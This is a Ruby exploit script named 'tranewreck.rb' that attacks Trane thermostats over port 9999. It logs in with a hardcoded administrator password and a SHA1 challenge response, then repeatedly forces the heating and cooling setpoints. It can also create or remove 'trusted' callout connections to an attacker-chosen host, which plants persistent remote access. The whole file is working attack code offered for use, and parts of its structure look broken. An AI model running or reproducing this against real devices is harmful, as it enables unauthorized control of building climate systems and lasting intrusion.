#!/usr/bin/env ruby
require 'digest'
require 'socket'
require 'optparse'
require 'json'

class Breaker

  options = {}

  interval = 2

  command = OptionParser.new do |opt|
    opt.banner = "Usage: tranewreck.rb -t [TARGET] [OPTIONS]"
    opt.separator  "Options"
    opt.on("-h","--help","help") do
      puts command
    end
    opt.on("-t n","--target=n","where?") do |val|
      options[:target] = val
    end
    opt.on("-H n" ,"--set_heat=n", OptionParser::DecimalInteger,"set heat int ") do |val|
      options[:heat] = val
    end
    opt.on("-C n","--set_cold=n", OptionParser::DecimalInteger,"set cold int ") do |val|
      options[:cold] = val
    end
    opt.on("-d n","--derail=n","makes new trusted connection to host:port") do |val|
      options[:derail] = val
    end
    opt.on("-r n","--rerail=n", OptionParser::DecimalInteger,"remove a given server from trusted connections.") do |val|
      options[:rerail] = val
    end
  end


  def self.poke(sock, data, terminator = /End\(\);\n/, dump = false)
    buf =  ''
    puts " - Sending: #{data}"
    sock.puts(data)
    begin
      line = sock.gets
      puts line if dump
      buf <<  line
    end until buf.match(terminator)
    return buf
  end


  def self.derail(s, derailer)
    derailer = derailer.split(":")
    sec_probe = '1.11.1::createSecureCallout("LINK","'+derailer[0]+'","'+derailer[1]+'","60",TRUE,TRUE);\0'
    data = poke(s, sec_probe ,/End\(\);\n/, true)
  end

  def self.rerail(s, id)
    sec_probe = '1.11.1::removeCallout('+id.to_s+');\0'
    data = poke(s, sec_probe ,/End\(\);\n/, true)
  end

  def self.set_points(s, heat, cool, interval)
    sec_probe = '1.7.1::subscribe();\0'
    data = poke(s, sec_probe)
    if data =~ /\x001\.7\.1::evListBegin\(\);\n\x001\.7\.1::evListItem\((?<target_id>\d{5}?),"(?<target_name>.*)".*\);\n\x001\.7\.1::evListEnd\(\)/i
      puts "Attacking #{$~[:target_name]} #{$~[:target_id]} \n heat temp: #{heat} deg F, cool temp: #{cool} deg F."
      sec_probe = "1.7.1.#{$~[:target_id]}.1.2::setHold(#{cool},#{heat});\0"
      Thread.new do
        while true do
            s.puts(sec_probe)
            puts Time.now
            sleep interval
          end
        end
      end
    end
    command.parse!
    host = options[:target] || false
    cool = options[:cold] || false
    heat = options[:heat] || false
    derail =  options[:derail] || false
    rerail = options[:rerail] || false
    port = 9999
    password = "Cold,,2100"
    permission = "ADMN"
    auth_id = ""
    auth_history = []

    unless !host
      s = TCPSocket.open(host, port)

      while line = s.gets
        data = line.chop
        if data.match(/1::evChallenge\(/)
          puts "TRANE challenge detected."
          data =~/1::evChallenge\((?<arg>.*),"(?<challenge>.*)"\);/
          arg = $~[:arg]
          challenge = $~[:challenge]
          puts " - Arg: #{arg}"
          puts " - Challenge: #{challenge}"
          evchallenge = challenge.gsub(/([^"]{2})/){|str| str.hex.chr}
          msg = arg.to_i.chr + password+ evchallenge
          puts " - Processed 'evchallenge': #{evchallenge}"
          puts " - Processed 'msg': #{msg}"
          assembled_response = "1::login(#{arg},\"#{Digest::SHA1.hexdigest(msg).upcase}\",\"#{permission}\",\"DefaultLabel\",,,,,);\n"
          puts " - Assembled login command: :#{assembled_response}"
          s.puts(assembled_response)
          if line = s.gets
            data = line.chop
            data =~ /1::evAuthorized\((?<auth>\d*)\);/
            auth_id = $~[:auth]
            auth_history << auth_id
            puts "Received--: "+ data
            puts " - Auth ID: #{auth_id}"
          end
          unless !heat && !cool
            set_points(s, heat, cool, interval)
          end
          puts "derail:"+derail.to_s
          unless !derail
            derail(s, derail)
          end
          unless !rerail
            rerail(s, rerail)
          end
        end
        s.close
      end
    end
end